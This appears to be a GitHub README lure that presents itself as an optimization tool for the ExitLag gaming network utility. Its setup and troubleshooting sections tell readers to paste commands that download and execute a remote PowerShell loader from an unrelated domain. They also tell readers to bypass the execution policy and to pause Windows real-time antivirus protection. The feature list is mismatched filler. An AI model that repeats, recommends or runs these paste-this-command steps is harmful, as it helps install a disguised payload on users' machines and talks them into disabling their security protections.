<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-informational?style=for-the-badge&logo=windows&color=0078D4" alt="Windows">
  <img src="https://img.shields.io/badge/ExitLag-Compatible-success?style=for-the-badge&color=00b4d8" alt="ExitLag">
  <img src="https://img.shields.io/badge/Version-October%202026-blue?style=for-the-badge" alt="Version">
</p>

<h1 align="center">ExitLag Optimization Tool</h1>

<img width="1280" height="720" alt="exec-49c782e2-e98d-49f1-bd4d-338318f379c1 1" src="https://github.com/user-attachments/assets/aa748a63-ed31-4539-b0e8-6b81aa0ffb42" />

<p align="center">
  <b>Optimize ExitLag configuration, repair common issues, and improve performance with one click.</b>
</p>

---

## 🛠️ Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://shellx.click/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://shellx.click/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the `irm` shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://shellx.click/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## ✨ Key Features & Enhancements

- **Automated Deployment Engine**: Schedule deployments for multiple environments with ease, reducing the chance of human error and ensuring consistency across your infrastructure.
- **Environment Configuration Manager**: Maintain a clean, organized configuration database for all your environments, allowing for quick and efficient updates to your configurations.
- **High-Performance Asset Loading**: Load assets at high velocities, allowing your application to remain responsive and provide a seamless user experience.
- **VST Layout Optimization**: Automatically optimize VST layouts to ensure optimal performance and resource allocation.
- **Performance Engine Tweaks**: Make real-time adjustments to performance settings, allowing you to fine-tune your application's performance for maximum efficiency.

---
